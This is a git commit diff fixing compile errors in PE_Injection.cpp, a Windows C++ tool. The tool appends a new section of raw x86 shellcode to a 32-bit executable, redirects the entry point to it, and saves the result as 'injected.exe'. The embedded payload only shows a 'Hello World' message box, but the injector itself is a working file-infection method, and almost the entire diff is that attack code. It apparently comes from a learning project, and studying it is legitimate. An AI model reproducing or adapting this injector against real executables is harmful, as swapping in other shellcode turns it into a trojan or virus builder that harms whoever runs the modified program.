095ff77713430c8e473034463da40530a61dd428
buffer-low <56985021+buffer-low@users.noreply.github.com>
2020-12-02 11:07:02 +0700

    fix

--- PE_Injection/PE_Injection.cpp
+++ PE_Injection/PE_Injection.cpp
@@ -1,38 +1,6 @@
 #include <Windows.h>
+#include <stdio.h>
 
-DWORD sectionContainRVA(DWORD rva, int numberOfSection, PIMAGE_SECTION_HEADER p) {
-	for (int i = 0; i < numberOfSection; i++) {
-		PIMAGE_SECTION_HEADER tmp = p + i;
-		if (tmp->VirtualAddress <= rva && rva < tmp->VirtualAddress + tmp->Misc.VirtualSize) return tmp->VirtualAddress;
-	}
-	return -1;
-}
-
-LPVOID rawAddressSectionContainRVA(LPVOID data, DWORD rva, int numberOfSection, PIMAGE_SECTION_HEADER p) {
-	for (int i = 0; i < numberOfSection; i++) {
-		PIMAGE_SECTION_HEADER tmp = p + i;
-		if (tmp->VirtualAddress <= rva && rva < tmp->VirtualAddress + tmp->Misc.VirtualSize)
-			return data + tmp->PointerToRawData;
-	}
-	return -1;
-}
-
-LPVOID rawAddressInDump(LPVOID data, DWORD rva, int numberOfSection, PIMAGE_SECTION_HEADER p) {
-	for (int i = 0; i < numberOfSection; i++) {
-		PIMAGE_SECTION_HEADER tmp = p + i;
-		if (tmp->VirtualAddress <= rva && rva < tmp->VirtualAddress + tmp->Misc.VirtualSize)
-			return data + tmp->PointerToRawData + rva - tmp->VirtualAddress;
-	}
-	return -1;
-}
-
-DWORD ordinalNumberSectionContainRVA(DWORD rva, int numberOfSection, PIMAGE_SECTION_HEADER p) {
-	for (int i = 0; i < numberOfSection; i++) {
-		PIMAGE_SECTION_HEADER tmp = p + i;
-		if (tmp->VirtualAddress <= rva && rva < tmp->VirtualAddress + tmp->Misc.VirtualSize) return i;
-	}
-	return -1;
-}
 
 int main(int argc, char * argv[]) {
 	wchar_t filename[50];
@@ -48,20 +16,20 @@ int main(int argc, char * argv[]) {
 		filename,
 		NULL
 	);
-	DWORD fileHandle = CreateFile(filename, GENERIC_READ, 0, NULL, 3, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE fileHandle = CreateFile(filename, GENERIC_READ, 0, NULL, 3, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (fileHandle == INVALID_HANDLE_VALUE) {
 		printf("[x] Invalid File\n");
 		return -1;
 	}
 
-	DWORD fileSize = GetFileSize(fileSize, NULL);
+	DWORD fileSize = GetFileSize(fileHandle, NULL);
 	LPVOID data = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
 	DWORD numberOfByteToRead;
 	ReadFile(fileHandle, data, fileSize, &numberOfByteToRead, NULL);
 	PIMAGE_DOS_HEADER pFileDosHeader = (PIMAGE_DOS_HEADER)data;
-	DWORD bits = *(DWORD*)(data + pFileDosHeader->e_lfanew + sizeof(IMAGE_FILE_HEADER));
+	DWORD bits = *(DWORD*)((char*)data + pFileDosHeader->e_lfanew + sizeof(IMAGE_FILE_HEADER));
 	if (bits == 0x10b) {
-		PIMAGE_NT_HEADERS32	pFileNTHeader = (PIMAGE_NT_HEADERS32)(data + pFileDosHeader->e_lfanew);
+		PIMAGE_NT_HEADERS32	pFileNTHeader = (PIMAGE_NT_HEADERS32)((char*)data + pFileDosHeader->e_lfanew);
 		DWORD numberOfSection = pFileNTHeader->FileHeader.NumberOfSections;
 		PIMAGE_SECTION_HEADER pFileSectionHeaderTable = (PIMAGE_SECTION_HEADER)((char*)pFileNTHeader + sizeof(IMAGE_NT_HEADERS32));
 		PIMAGE_SECTION_HEADER tmp = pFileSectionHeaderTable + (numberOfSection - 1);
@@ -70,10 +38,10 @@ int main(int argc, char * argv[]) {
 		DWORD injectSectionRSize = 50 * pFileNTHeader->OptionalHeader.FileAlignment;
 		DWORD injectSectionPointerToRawData = tmp->PointerToRawData + tmp->SizeOfRawData;
 		// craft new section
-		LPVOID shellcode = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, injectSectionRSize);
+		char * shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, injectSectionRSize);
 		char HelloWorld[] = "Hello World\0";
 		char Caption[] = "Caption\0";
-		char User32Dll = "User32.dll\0";
+		char User32Dll[] = "User32.dll\0";
 		char getProcaddr[] = "GetProcAddress\0";
 		char loadLib[] = "LoadLibraryA\0";
 		char messageBox[] = "MessageBoxA\0";
@@ -103,7 +71,7 @@ int main(int argc, char * argv[]) {
 			"\x24\x14\xEB\x2D\x8B\x44\x24\x20\x03\x02\x50\x8D\x05", 43);
 		CopyMemory(shellcode + 173, &getProcRVA, 4);
 		CopyMemory(shellcode + 177,
-			"\x50\xE8\x72\x00\x00\x00\x83\xC4\x08\x85\xC0\x75\x13\x41\x33
+			"\x50\xE8\x72\x00\x00\x00\x83\xC4\x08\x85\xC0\x75\x13\x41\x33"
 			"\xC0\x66\x8B\x03\xC1\xE0\x02\x03\x44\x24\x24\x8B\x00\x89\x44\x24"
 			"\x10\x83\xC2\x04\x83\xC3\x02\x83\xF9\x02\x75\x99\x8B\x5C\x24\x14"
 			"\x03\x5C\x24\x20\x8D\x05", 53);
@@ -113,14 +81,14 @@ int main(int argc, char * argv[]) {
 			"\x08\x8B\x5C\x24\x10\x03\x5C\x24\x20\x8D\x05", 17);
 		CopyMemory(shellcode + 251, &messageRVA, 4);
 		CopyMemory(shellcode + 255,
-			"\x50
+			"\x50"
 			"\x8B\x44\x24\x0C\x50\xFF\xD3\x89\x44\x24\x04\x8B\x5C\x24\x04\x33"
 			"\xC0\x50\x8D\x05", 21);
 		CopyMemory(shellcode + 276, &captionRVA, 4);
 		CopyMemory(shellcode + 280, "\x50\x8D\x05", 3);
-		CopyMemory(shellcode + 283, &helloworldRVA, 4);
+		CopyMemory(shellcode + 283, &helloWorldRVA, 4);
 		CopyMemory(shellcode + 287,
-			"\x50
+			"\x50"
 			"\x33\xC0\x50\xFF\xD3\x83\xC4\x20\x5D\x55\x8B\xEC\x52\x53\x56\x57"
 			"\x33\xC0\x8B\x74\x24\x18\x8B\x7C\x24\x1C\x8A\x06\x8A\x27\x84\xC0"
 			"\x74\x0E\x84\xE4\x74\x0A\x2A\xC4\x32\xE4\x46\x47\x84\xC0\x74\xEA"
@@ -145,7 +113,7 @@ int main(int argc, char * argv[]) {
 		injectNTHeader.OptionalHeader.SizeOfImage += injectSectionVSize;
 		injectNTHeader.OptionalHeader.AddressOfEntryPoint = injectSectionRVA;
 		HANDLE newFile = CreateFile(
-			"injected.exe",
+			L"injected.exe",
 			GENERIC_WRITE,
 			FILE_SHARE_READ,
 			NULL,
@@ -154,14 +122,14 @@ int main(int argc, char * argv[]) {
 			NULL
 		);
 		WriteFile(newFile, &injectDOSheader, sizeof(IMAGE_DOS_HEADER), &numberOfByteToRead, NULL);
-		WriteFile(newFile, data + sizeof(IMAGE_DOS_HEADER), pFileDosHeader->e_lfanew - sizeof(IMAGE_DOS_HEADER), &numberOfByteToRead, NULL);
-		WriteFile(newFile, &injectNTHeader, sizeof(IMAGE_NT_HEADER), &numberOfByteToRead, NULL);
+		WriteFile(newFile, (char*)data + sizeof(IMAGE_DOS_HEADER), pFileDosHeader->e_lfanew - sizeof(IMAGE_DOS_HEADER), &numberOfByteToRead, NULL);
+		WriteFile(newFile, &injectNTHeader, sizeof(IMAGE_NT_HEADERS), &numberOfByteToRead, NULL);
 		for (int i = 0; i < numberOfSection; i++) {
 			PIMAGE_SECTION_HEADER tmp = pFileSectionHeaderTable + i;
-			WriteFile(newFile, tmp, sizeof(IMAGE_SECTION_HEADER));
+			WriteFile(newFile, tmp, sizeof(IMAGE_SECTION_HEADER), &numberOfByteToRead, NULL);
 		}
 		IMAGE_SECTION_HEADER injectSectionHeader;
-		injectSectionHeader.VirtualSize = injectSectionVSize;
+		injectSectionHeader.Misc.VirtualSize = injectSectionVSize;
 		injectSectionHeader.SizeOfRawData = injectSectionRSize;
 		injectSectionHeader.VirtualAddress = injectSectionRVA;
 		injectSectionHeader.PointerToRawData = injectSectionPointerToRawData;
@@ -171,19 +139,19 @@ int main(int argc, char * argv[]) {
 		injectSectionHeader.NumberOfLinenumbers = 0;
 		injectSectionHeader.NumberOfRelocations = 0;
 
-		WriteFile(newFile, &injectSectionHeader, sizeof(IMAGE_SECTION_HEADER));
+		WriteFile(newFile, &injectSectionHeader, sizeof(IMAGE_SECTION_HEADER), &numberOfByteToRead, NULL);
 		DWORD startOfSection = pFileSectionHeaderTable->PointerToRawData;
 		DWORD currPointer = SetFilePointer(newFile, 0, NULL, FILE_CURRENT);
 		while (currPointer < startOfSection) {
-			WriteFile(newFile, "\0", 1);
+			WriteFile(newFile, "\0", 1, &numberOfByteToRead, NULL);
 			currPointer++;
 		}
 		for (int i = 0; i < numberOfSection; i++) {
 			PIMAGE_SECTION_HEADER tmp = pFileSectionHeaderTable + i;
-			LPVOID section = data + tmp->PointerToRawData;
-			WriteFile(newFile, section, tmp->SizeOfRawData);
+			LPVOID section = (LPVOID)((char*)data + tmp->PointerToRawData);
+			WriteFile(newFile, section, tmp->SizeOfRawData, &numberOfByteToRead, NULL);
 		}
-		WriteFile(newFile, shellcode, injectSectionRSize);
+		WriteFile(newFile, shellcode, injectSectionRSize, &numberOfByteToRead, NULL);
 		CloseHandle(newFile);
 	}
 }
